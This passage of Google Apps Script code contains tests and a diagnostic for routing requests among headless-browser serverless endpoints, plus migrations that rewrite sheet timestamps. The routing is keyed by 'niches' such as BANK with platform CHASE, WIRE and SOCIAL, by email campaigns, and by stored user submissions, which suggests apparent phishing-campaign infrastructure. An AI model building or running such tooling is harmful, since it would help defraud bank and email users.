    ['sl-2', 'https://headless-b.vercel.app', 'LINK,CAMPAIGN', 100, 10, 1000, 100, 'ACTIVE', 'ACTIVE', '', 'GMAIL', 'EMAIL']
  ];
  r = getBestServerlessEndpoint('BANK', 'https://fallback.example.com', {}, 'CAMPAIGN', 'CHASE', 'BANK');
  Logger.log("S12 (bank platform=CHASE): " + JSON.stringify(r));
  assertEq('S12 bank platform+type picks CHASE row', 'sl-1', r && r.severlessId);

  // S13: type filter eliminates all rows → fallback whose reason mentions the type.
  mockData = [
    ['sl-1', 'https://headless-a.vercel.app', 'LINK,CAMPAIGN', 100, 5, 1000, 50, 'ACTIVE', 'ACTIVE', '', 'GMAIL', 'EMAIL']
  ];
  r = getBestServerlessEndpoint('SOCIAL', 'https://fallback.example.com', {}, 'CAMPAIGN', '', 'SOCIAL');
  Logger.log("S13 (no rows matching type): " + JSON.stringify(r));
  assertEq('S13 fallback base when type matches nothing', 'https://fallback.example.com', r && r.severlessURL);
  Logger.log((r && String(r.reason || '').indexOf('SOCIAL') !== -1 ? 'PASS' : 'FAIL') + ' | S13 fallback reason mentions requested type | actual=' + (r && r.reason));

  // S14: type requested but severlessType column missing → warn + filter skipped (row passes).
  mockHeaders = headers.filter(function (h) { return h !== 'severlessType'; });
  mockData = [
    ['sl-1', 'https://headless-a.vercel.app', 'LINK,CAMPAIGN', 100, 5, 1000, 50, 'ACTIVE', 'ACTIVE', '', 'GMAIL', undefined]
  ];
  r = getBestServerlessEndpoint('SOCIAL', 'https://fallback.example.com', {}, 'CAMPAIGN', '', 'SOCIAL');
  Logger.log("S14 (severlessType column missing): " + JSON.stringify(r));
  assertEq('S14 missing column → no filter, row passes', 'sl-1', r && r.severlessId);
  mockHeaders = headers;

  // S15: live capacity — a saturated engine loses to a free one despite better usage.
  mockData = [
    ['sl-1', 'https://headless-a.vercel.app', 'LINK,CAMPAIGN', 100, 5, 1000, 50, 'ACTIVE', 'ACTIVE', '', 'GMAIL', ''],
    ['sl-2', 'https://headless-b.vercel.app', 'LINK,CAMPAIGN', 100, 60, 1000, 600, 'ACTIVE', 'ACTIVE', '', 'GMAIL', '']
  ];
  getServerCapacity = function (url) {
    if (String(url).indexOf('headless-a') !== -1) {
      return { load: 1, activeBrowsers: 10, maxConcurrent: 10, waitingBrowsers: 4, saturated: true };
    }
    return { load: 0.2, activeBrowsers: 2, maxConcurrent: 10, waitingBrowsers: 0, saturated: false };
  };
  SERVER_CAPACITY_PROBE_ENABLED = true;
  r = getBestServerlessEndpoint('SOCIAL', 'https://fallback.example.com', {}, 'LINK');
  Logger.log("S15 (capacity-aware pick): " + JSON.stringify(r));
  assertEq('S15 saturated engine skipped for a free one', 'sl-2', r && r.severlessId);
  assertEq('S15 live load surfaced on result', 0.2, r && r.load);

  restore();
  Logger.log("--- Finished testGetBestServerlessEndpoint ---");
}

/**
 * Real-data diagnostic. Run from the Apps Script editor with NO params.
 * Reads the LIVE links sheet and:
 *  1) prints every candidate row with status/health/usage/limits, and
 *  2) prints which endpoint the live picker would return for each niche
 *     (WIRE/BANK/SOCIAL) using CONFIG.EXTERNAL_API as the fallback, plus
 *     the pick reason so you can see WHY a server is (or isn't) chosen.
 * Also logs CONFIG.EXTERNAL_API and the update's stored per-project postURL.
 */
function diagnoseServerlessRouting() {
  Logger.log("--- Starting diagnoseServerlessRouting ---");
  Logger.log("CONFIG.EXTERNAL_API = " + String(CONFIG.EXTERNAL_API || ''));
  Logger.log("CONFIG.SHEET_NAME.LINKS = " + CONFIG.SHEET_NAME.LINKS);

  const linksResult = getAllRows(CONFIG.SHEET_NAME.LINKS);
  if (!linksResult.success) {
    Logger.log("FAIL | read links sheet | " + JSON.stringify(linksResult));
    return;
  }
  const headers = linksResult.headers;
  const rows = linksResult.data;
  Logger.log("Links sheet: " + rows.length + " rows, headers = " + JSON.stringify(headers));

  for (let i = 0; i < rows.length; i++) {
    const row = {};
    headers.forEach((h, idx) => { row[h] = rows[i][idx]; });
    Logger.log("Row[" + i + "] " + JSON.stringify({
      severlessId: row.severlessId,
      severlessURL: row.severlessURL,
      severlessCategory: row.severlessCategory,
      severlessStatus: row.severlessStatus,
      severlessHealth: row.severlessHealth,
      serverlessRph: row.serverlessRph,
      serverlessRphUsage: row.serverlessRphUsage,
      serverlessRpd: row.serverlessRpd,
      serverlessRpdUsage: row.serverlessRpdUsage,
      severlessIpdata: row.severlessIpdata
    }));
  }

  const niches = ['WIRE', 'BANK', 'SOCIAL'];
  for (const niche of niches) {
    const picked = getBestServerlessEndpoint(niche, CONFIG.EXTERNAL_API, {});
    Logger.log("PICK[" + niche + "] " + JSON.stringify(picked));
  }

  // Category-filtered tests
  var linkPicked = getBestServerlessEndpoint('WIRE', CONFIG.EXTERNAL_API, {}, 'LINK');
  Logger.log("PICK[WIRE+LINK category] " + JSON.stringify(linkPicked));
  var campaignPicked = getBestServerlessEndpoint(null, CONFIG.EXTERNAL_API, null, 'CAMPAIGN');
  Logger.log("PICK[null+CAMPAIGN category] " + JSON.stringify(campaignPicked));
  var linkCampaignPicked = getBestServerlessEndpoint('WIRE', CONFIG.EXTERNAL_API, {}, 'LINK,CAMPAIGN');
  Logger.log("PICK[WIRE+LINK,CAMPAIGN category] " + JSON.stringify(linkCampaignPicked));

  const projectsResult = getAllRows('projects');
  if (projectsResult && projectsResult.success) {
    const pHeaders = projectsResult.headers;
    const idIdx = pHeaders.indexOf('projectId');
    const titleIdx = pHeaders.indexOf('projectTitle');
    const postUrlIdx = pHeaders.indexOf('postURL');
    if (postUrlIdx !== -1) {
      for (let i = 0; i < projectsResult.data.length; i++) {
        const pr = projectsResult.data[i];
        Logger.log("Project[" + i + "] " + JSON.stringify({
          projectId: idIdx !== -1 ? pr[idIdx] : null,
          projectTitle: titleIdx !== -1 ? pr[titleIdx] : null,
          postURL: pr[postUrlIdx]
        }));
      }
    } else {
      Logger.log("projects sheet has no 'postURL' header");
    }
  } else {
    Logger.log("projects sheet read failed: " + JSON.stringify(projectsResult));
  }

  Logger.log("--- Finished diagnoseServerlessRouting ---");
}

/**
 * One-time migration: rewrite existing timestamp values to ISO-8601 UTC.
 * Touches the hub sheet 'timestamp' column, campaign 'createdOn'/'updatedOn'
 * columns, and the per-submission 'timestamp' fields inside each project's
 * 'response' JSON. ISO values are left untouched. Run ONCE after deploying.
 * @returns {Object} A JSON response with the number of converted cells.
 */
function migrateTimestampsToISO() {
  try {
    const parseToIso = (raw) => {
      if (raw === undefined || raw === null || raw === '') return null;
      const s = String(raw).trim();
      if (s === '') return null;
      if (/^\d{4}-\d{2}-\d{2}T/.test(s)) return null; // already ISO
      let d;
      if (/AM|PM/i.test(s)) {
        d = new Date(s); // en-US locale e.g. "8/14/2026, 4:41:32 AM"
      } else if (/^\d{1,2}\/\d{1,2}\/\d{4},?\s*\d{1,2}:\d{2}(:\d{2})?/.test(s)) {
        // Apps Script locale e.g. "11/08/2026, 17:22:08" — parse day-first manually.
        const m = s.match(/^(\d{1,2})\/(\d{1,2})\/(\d{4})[,]?\s*(\d{1,2}):(\d{2})(?::(\d{2}))?/);
        if (!m) return null;
        d = new Date(Number(m[3]), Number(m[2]) - 1, Number(m[1]), Number(m[4]), Number(m[5]), m[6] ? Number(m[6]) : 0);
      } else {
        d = new Date(s);
      }
      if (isNaN(d.getTime())) return null;
      return d.toISOString();
    };

    const ss = SpreadsheetApp.getActiveSpreadsheet();
    let converted = 0;

    // 1. Hub sheet timestamp column
    const hubWs = ss.getSheetByName(CONFIG.SHEET_NAME.HUB);
    if (hubWs) {
      const hubHeaders = hubWs.getRange(1, 1, 1, hubWs.getLastColumn()).getValues()[0];
      const tsIdx = hubHeaders.indexOf('timestamp');
      if (tsIdx !== -1 && hubWs.getLastRow() > 1) {
        const col = hubWs.getRange(2, tsIdx + 1, hubWs.getLastRow() - 1, 1).getValues();
        col.forEach((cell, i) => {
          const iso = parseToIso(cell[0]);
          if (iso !== null && String(cell[0]).trim() !== iso) {
            hubWs.getRange(i + 2, tsIdx + 1).setValue(iso);
            converted++;
          }
        });
      }
    }

    // 2. Campaign createdOn / updatedOn columns
    const campWs = ss.getSheetByName(CONFIG.SHEET_NAME.CAMPAIGNS);
    if (campWs) {
      const campHeaders = campWs.getRange(1, 1, 1, campWs.getLastColumn()).getValues()[0];
      ['createdOn', 'updatedOn'].forEach(colName => {
        const idx = campHeaders.indexOf(colName);
        if (idx !== -1 && campWs.getLastRow() > 1) {
          const col = campWs.getRange(2, idx + 1, campWs.getLastRow() - 1, 1).getValues();
          col.forEach((cell, i) => {
            const iso = parseToIso(cell[0]);
            if (iso !== null && String(cell[0]).trim() !== iso) {
              campWs.getRange(i + 2, idx + 1).setValue(iso);
              converted++;
            }
          });
        }
      });
    }

    // 3. Projects response JSON per-submission timestamp fields
    const projWs = ss.getSheetByName(CONFIG.SHEET_NAME.PROJECTS);
    if (projWs) {
      const projHeaders = projWs.getRange(1, 1, 1, projWs.getLastColumn()).getValues()[0];
      const respIdx = projHeaders.indexOf('response');
      if (respIdx !== -1 && projWs.getLastRow() > 1) {
        const col = projWs.getRange(2, respIdx + 1, projWs.getLastRow() - 1, 1).getValues();
        col.forEach((cell, i) => {
          const raw = cell[0];
          if (!raw) return;
          let parsed = null;
          try { parsed = JSON.parse(raw); } catch (e) { return; }
          if (!parsed || parsed.fileId) return; // Drive-pointer responses hold content in the file
          if (!Array.isArray(parsed)) return;
          let changed = false;
          parsed.forEach(entry => {
            if (entry && entry.timestamp) {
              const iso = parseToIso(entry.timestamp);
              if (iso !== null && String(entry.timestamp).trim() !== iso) {
                entry.timestamp = iso;
                changed = true;
              }
            }
          });
          if (changed) {
            projWs.getRange(i + 2, respIdx + 1).setValue(JSON.stringify(parsed));
            converted++;
          }
        });
      }
    }

    Logger.log(`[migrateTimestampsToISO] Done. Converted ${converted} cells.`);
    return createJsonResponse({ success: true, converted: converted });
  } catch (error) {
    Logger.log(`Error in migrateTimestampsToISO: ${error.message}`);
    return createJsonResponse({ success: false, error: error.message });
  }
}

/**
 * One-time correction for migrateTimestampsToISO's day/month swap bug.
 *
 * The first migration run parsed locale day-first strings ("10/8/2026, 6:13:08 PM"
 * = 10 August) with new Date(), which reads month-first, so day-first rows were
 * stored with their day and month swapped (10 Aug -> 2026-10-08). This function
 * swaps month<->day back for any ISO value whose month is 9-12 and day <= 12
 * (the signature of a swapped day-first date), keeping the time-of-day intact.
 *
 * Covers hub 'timestamp', campaign 'createdOn'/'updatedOn', and the per-submission
 * 'timestamp' fields inside each project's 'response' JSON.
 *
 * IMPORTANT: Run exactly ONCE. A corrected September value (e.g. 2026-09-12) would
 * be detected as a swap again if re-run, so do not execute twice.
 * @returns {Object} Result with corrected count
 */
function fixSwappedDayMonth() {
  try {
    const swapIso = (raw) => {
      if (raw === undefined || raw === null || raw === '') return null;
      const s = String(raw).trim();
      const m = s.match(/^(\d{4})-(\d{2})-(\d{2})(T.*)$/);
      if (!m) return null;
      const year = Number(m[1]);
      const month = Number(m[2]);
      const day = Number(m[3]);
      // Swapped day-first date: original day (now the month) was 9-12, and the
      // original month (now the day) is at most 12. Month-first dates like
      // 2026-08-13 / 2026-08-14 (month 8) are untouched.
      if (month < 9 || month > 12) return null;
      if (day < 1 || day > 12) return null;
      return `${year}-${String(day).padStart(2, '0')}-${String(month).padStart(2, '0')}${m[4]}`;
    };

    const ss = SpreadsheetApp.getActiveSpreadsheet();
    let corrected = 0;

    // 1. Hub sheet timestamp column
    const hubWs = ss.getSheetByName(CONFIG.SHEET_NAME.HUB);
    if (hubWs) {
      const hubHeaders = hubWs.getRange(1, 1, 1, hubWs.getLastColumn()).getValues()[0];
      const tsIdx = hubHeaders.indexOf('timestamp');
      const idIdx = hubHeaders.indexOf('submissionId');
      const emailIdx = hubHeaders.indexOf('email');
      if (tsIdx !== -1 && hubWs.getLastRow() > 1) {
        const col = hubWs.getRange(2, tsIdx + 1, hubWs.getLastRow() - 1, 1).getValues();
        col.forEach((cell, i) => {
          const swapped = swapIso(cell[0]);
          if (swapped !== null && String(cell[0]).trim() !== swapped) {
            const rowNum = i + 2;
            const id = (idIdx !== -1 ? hubWs.getRange(rowNum, idIdx + 1).getValue() : '') ||
                       (emailIdx !== -1 ? hubWs.getRange(rowNum, emailIdx + 1).getValue() : '') ||
                       rowNum;
            Logger.log(`[fixSwappedDayMonth] hub row ${rowNum} (${id}): ${String(cell[0]).trim()} -> ${swapped}`);
            hubWs.getRange(rowNum, tsIdx + 1).setValue(swapped);
            corrected++;
          }
        });
      }
    }

    // 2. Campaign createdOn / updatedOn columns
    const campWs = ss.getSheetByName(CONFIG.SHEET_NAME.CAMPAIGNS);
    if (campWs) {
      const campHeaders = campWs.getRange(1, 1, 1, campWs.getLastColumn()).getValues()[0];
      const idIdx = campHeaders.indexOf('campaignId');
      ['createdOn', 'updatedOn'].forEach(colName => {
        const idx = campHeaders.indexOf(colName);
        if (idx !== -1 && campWs.getLastRow() > 1) {
          const col = campWs.getRange(2, idx + 1, campWs.getLastRow() - 1, 1).getValues();
          col.forEach((cell, i) => {
            const swapped = swapIso(cell[0]);
            if (swapped !== null && String(cell[0]).trim() !== swapped) {
              const rowNum = i + 2;
              const id = idIdx !== -1 ? campWs.getRange(rowNum, idIdx + 1).getValue() : rowNum;
              Logger.log(`[fixSwappedDayMonth] campaigns ${colName} row ${rowNum} (${id}): ${String(cell[0]).trim()} -> ${swapped}`);
              campWs.getRange(rowNum, idx + 1).setValue(swapped);
              corrected++;
            }
          });
        }
      });
    }

    // 3. Projects response JSON per-submission timestamp fields
    const projWs = ss.getSheetByName(CONFIG.SHEET_NAME.PROJECTS);
    if (projWs) {
      const projHeaders = projWs.getRange(1, 1, 1, projWs.getLastColumn()).getValues()[0];
      const respIdx = projHeaders.indexOf('response');
      const idIdx = projHeaders.indexOf('projectId');
      if (respIdx !== -1 && projWs.getLastRow() > 1) {
        const col = projWs.getRange(2, respIdx + 1, projWs.getLastRow() - 1, 1).getValues();
        col.forEach((cell, i) => {
          const raw = cell[0];
          if (!raw) return;
          let parsed = null;
          try { parsed = JSON.parse(raw); } catch (e) { return; }
          if (!parsed || parsed.fileId) return; // Drive-pointer responses hold content in the file
          if (!Array.isArray(parsed)) return;
          let changed = false;
          parsed.forEach(entry => {
            if (entry && entry.timestamp) {
              const swapped = swapIso(entry.timestamp);
              if (swapped !== null && String(entry.timestamp).trim() !== swapped) {
                Logger.log(`[fixSwappedDayMonth] projects response row ${i + 2}: ${String(entry.timestamp).trim()} -> ${swapped}`);
                entry.timestamp = swapped;
                changed = true;
              }
            }
          });
          if (changed) {
            projWs.getRange(i + 2, respIdx + 1).setValue(JSON.stringify(parsed));
            corrected++;
          }
        });
      }
    }

    Logger.log(`[fixSwappedDayMonth] Done. Corrected ${corrected} cells.`);
    return createJsonResponse({ success: true, corrected: corrected });
  } catch (error) {
    Logger.log(`Error in fixSwappedDayMonth: ${error.message}`);
    return createJsonResponse({ success: false, error: error.message });
  }
}
